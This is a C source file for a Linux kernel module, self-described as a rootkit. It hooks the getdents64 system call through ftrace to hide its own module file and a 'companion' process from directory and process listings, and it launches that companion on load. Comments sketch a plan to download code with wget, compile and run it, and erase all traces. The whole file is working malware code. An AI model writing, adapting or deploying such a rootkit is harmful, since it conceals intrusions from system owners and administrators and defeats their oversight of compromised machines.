#include <linux/init.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/kernel.h>
#include <linux/kallsyms.h>
#include <asm/unistd.h>
#include <linux/smp.h>
#include <linux/preempt.h>
#include <linux/vmalloc.h>
#include <linux/ftrace.h>
#include <linux/dirent.h>
#include <linux/fs.h>
#include <linux/string.h>
#include <linux/ctype.h>
#include <linux/file.h>
#include <linux/stat.h>
#include <linux/sched/signal.h>

// https://www.intel.com/content/www/us/en/docs/dpcpp-cpp-compiler/developer-guide-reference/2024-1/foptimize-sibling-calls.html
#pragma GCC optimize("-fno-optimize-sibling-calls")

struct ftrace_hook {
    const char *name;
    void *function;
    void *original;

    unsigned long address;
    struct ftrace_ops ops;
};

int pid_companion = -1;

static int find_sys_call_addr(struct ftrace_hook *hook) {
    hook->address = kallsyms_lookup_name(hook->name);
    if (!hook->address) {
        printk(KERN_ERR "Failed to find syscall table\n");
        return 1;
    }
    *((unsigned long*) hook->original) = hook->address;
    return 0;
}

static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *ops, struct ftrace_regs *regs)
{
    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);

    if(!within_module(parent_ip, THIS_MODULE))
        ((struct pt_regs *)(regs))->ip = (unsigned long) hook->function;
}

static int fh_install_hook(struct ftrace_hook *hook)
{
    int err;
    err = find_sys_call_addr(hook);
    if(err)
        return err;
    /* For many of function hooks (especially non-trivial ones), the $rip
     * register gets modified, so we have to alert ftrace to this fact. This
     * is the reason for the SAVE_REGS and IP_MODIFY flags. However, we also
     * need to OR the RECURSION_SAFE flag (effectively turning if OFF) because
     * the built-in anti-recursion guard provided by ftrace is useless if
     * we're modifying $rip. This is why we have to implement our own checks
     * (see USE_FENTRY_OFFSET). */
    hook->ops.func = fh_ftrace_thunk;
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
            | FTRACE_OPS_FL_RECURSION
            | FTRACE_OPS_FL_IPMODIFY;

    err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
    if(err)
    {
        printk(KERN_INFO "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
        return err;
    }

    err = register_ftrace_function(&hook->ops);
    if(err)
    {
        printk(KERN_INFO "rootkit: register_ftrace_function() failed: %d\n", err);
        return err;
    }

    return 0;
}

static void fh_remove_hook(struct ftrace_hook *hook)
{
    int err;
    err = unregister_ftrace_function(&hook->ops);
    if(err)
    {
        printk(KERN_DEBUG "rootkit: unregister_ftrace_function() failed: %d\n", err);
    }

    err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
    if(err)
    {
        printk(KERN_DEBUG "rootkit: ftrace_set_filter_ip() failed: %d\n", err);
    }
}

static asmlinkage long (*original_call)(const struct pt_regs *);


/*
 * di -> FD
 * si -> struct dirent
 * dx -> count, taille de buffer %di
*/

static inline int is_digit(int c) {
    return (c >= '0' && c <= '9');
}


static bool is_numeric(char *str) {
  int i = 0;
  while (str[i] && is_digit(str[i])) {
    i++;
  }
  return (i == strlen(str));
}

static asmlinkage long myGetDents(const struct pt_regs *regs) {

    printk(KERN_INFO "Hello there\n");
    int dirent_idx = 0;
    int buff_pid = -1;
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 __user *)regs->si;
    struct linux_dirent64* dirent_buff;
//   long int          count = regs->dx;
//    long unsigned int fd = regs->di;

    int getdent_ret = original_call(regs);

    if (getdent_ret <= 0) {
        return getdent_ret;
    }
    void *dbuf = (void *)(dirent);
  //array of "string to hide"
    char *string_to_hide[] = {"rootkit.ko", NULL};
    int to_hide = 0;

    while (dirent_idx + to_hide< getdent_ret) {
      dirent_buff = (struct linux_dirent64 *)(dbuf + dirent_idx);
      int i = 0;
      if (is_numeric(dirent_buff->d_name)) {
        buff_pid = (int)simple_strtol(dirent_buff->d_name, NULL, 10);
        if (buff_pid == pid_companion) {
            to_hide += dirent_buff->d_reclen;
            // So if we match, we just copy the next dirent_struct list until the end to the current one, so, it remove the chain link
            memcpy(dbuf + dirent_idx, dbuf + dirent_idx + dirent_buff->d_reclen, getdent_ret - (dirent_idx + dirent_buff->d_reclen));
        }
      } else {
        while (string_to_hide[i] != NULL) {
          if (strstr(dirent_buff->d_name, string_to_hide[i]) != NULL) {
            to_hide += dirent_buff->d_reclen;
            // So if we match, we just copy the next dirent_struct list until the end to the current one, so, it remove the chain link
            memcpy(dbuf + dirent_idx, dbuf + dirent_idx + dirent_buff->d_reclen, getdent_ret - (dirent_idx + dirent_buff->d_reclen));
            break ;
          }
          i++;
        }
      }
    if (string_to_hide[i] == NULL || buff_pid != pid_companion) {
      // We increment only when it's not a match
      dirent_idx += dirent_buff->d_reclen;
    }
  }

    /*
   printf("%-10s ", (d_type == DT_REG) ?  "regular" :
   (d_type == DT_DIR) ?  "directory" :
   (d_type == DT_FIFO) ? "FIFO" :
   (d_type == DT_SOCK) ? "socket" :
   (d_type == DT_LNK) ?  "symlink" :
   (d_type == DT_BLK) ?  "block dev" :
   (d_type == DT_CHR) ?  "char dev" : "???");
    */
	  return dirent_idx;
}



static  struct ftrace_hook *f_hook[] = {&(struct ftrace_hook){
    .name = "__x64_sys_getdents64",
    .function = (myGetDents),
    .original = (&original_call),
}, NULL};

static int __init rootkit_init(void) {
    printk(KERN_INFO "%i\n", current->pid);
    char *argv[] = {"/start_companion", NULL};
    char *envp[] = { "HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };

  // Protocol:

  // Probably have to run a gcc .c
  // We could host the .c on a github or any server
  // So we would like download the .c, with a wget
  // Then compile it gcc
  // Then launch the companion
  // Then remove all trace

  // So it has to be obfuscate from ps : How do we get the PID ?
  // It's possible to get the pid of a kernelModule with current->pid

    int r = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
    if (r) {
      printk(KERN_INFO "Rootkit has been loaded\n");
    }
    struct task_struct *task;
    pid_t pid_buff = -1;
   printk(KERN_INFO "PLEASE");
    for_each_process(task) {
      if (!strcmp(task->comm, "companion")) {
        pid_companion = task->pid;
        printk(KERN_INFO "PLEASE2");
        break ;
      }
      pid_buff = task->pid;
    }
    printk(KERN_INFO "PID %d", pid_companion);
    printk(KERN_INFO "pid %d", pid_companion);
    if (fh_install_hook(f_hook[0])) {
      printk(KERN_INFO "Bruh minstall hook eroor\n");
    }

    return 0;
}

static void __exit rootkit_exit(void) {
    fh_remove_hook(f_hook[0]);
    printk(KERN_INFO "Rootkit has been unloaded\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
MODULE_LICENSE("GPL");
